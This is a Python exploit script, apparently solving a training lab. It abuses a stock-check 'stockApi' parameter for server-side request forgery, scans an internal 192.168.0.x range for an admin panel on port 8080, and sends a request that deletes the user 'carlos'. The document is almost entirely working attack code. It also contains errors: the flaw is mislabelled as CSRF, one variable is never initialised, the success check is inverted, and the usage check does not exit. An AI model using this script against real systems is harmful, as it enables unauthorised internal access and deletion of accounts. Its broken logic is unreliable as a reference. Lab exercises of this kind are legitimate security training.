# Basic SSRF(Server Side Request Forgery) against another back-end system

'''
Vulnerable feature - stock check functionality

Goal - use the stock check functionality to scan the internal 192.168.0.X range for an admin interface on port 8080, then use it to delete the user Carlos.

Analysis:
application running on: http://192.168.0.190:8080/admin

delete Carlos: http://192.168.0.190:8080/admin/delete?username=carlos
'''

import requests 
import sys
from requests.api import request
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # Disable insecure request warning

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'} # Sending proxies to Burp

def check_admin_hostname(url):
    check_stock_path = "/product/stock" # This is a page that has a vulnerable CSRF parameter
    admin_hostname = '' 
    for i in range(1,256): # Creating for loop to 255 to enumarete this range 192.168.0.0-255
        hostname = 'http://192.168.0.%s:8080/admin' %i
        params = {'stockApi': hostname} # This is a parameters of the request
        r = requests.post(url + check_stock_path, data=params, verify=False, proxies=proxies) # Call request, verify is False because we dont want to verify TLS certificates, proxies is set to proxies because the request will be sent through the Burp first before its sent to the application
        if r.status_code == 200:
            admin_ip_address = '192.168.0.%s' %i # Admin hostname is equal to
            break 
    
    if admin_ip_address == '':
        print("(-) Could not find admin hostname.")
    return admin_ip_address

def delete_user(url, admin_ip_address):
    delete_user_url_ssrf_payload = 'http://%s:8080/admin/delete?username=carlos' %admin_ip_address
    check_stock_path = '/product/stock' # Check page that is vulnerable
    params = {'stockApi': delete_user_url_ssrf_payload}
    r = requests.post(url + check_stock_path, data=params, verify=False, proxies=proxies)

    # Check if user was deleted
    check_admin_url_ssrf_payload = 'http://%s:8080/admin' % admin_ip_address
    params2 = {'stockApi': check_admin_url_ssrf_payload}
    r = requests.post(url + check_stock_path, data=params2, verify=False, proxies=proxies)
    if 'User deleted suxxessfully' in r.text: # Print message if was successfully
        print("(-) Exploit was unsuccessful.")
    else:
        print("(+) Successfully deleted Carlos user")

def main():
    if len(sys.argv) !=2: # if the length of the parametr that you give to the script is not equal to 2
        print("(+) Usage: %s <url>" % sys.argv[0]) # Print a message usage instruction, print the name of the script and that it takes parametr URL 
        print("(+) Example: %s www.example.com" % sys.argv[0]) # Put there example and take the name of the script

    url = sys.argv[1] # Take a parametr that the user gave us
    print("(+) Finding admin hostname...") # Show message that the program start
    admin_ip_address = check_admin_hostname(url) # Take this method
    print("(+) Found the admin ip address: %s" % admin_ip_address) # Show message that the admin ip address was found
    print("(+) Deleting Carlos user...") # Show message that deleting user is in progress
    delete_user(url, admin_ip_address) # Delete user by this url and this admin ip address

if __name__ == "__main__": # Find name method
    main()
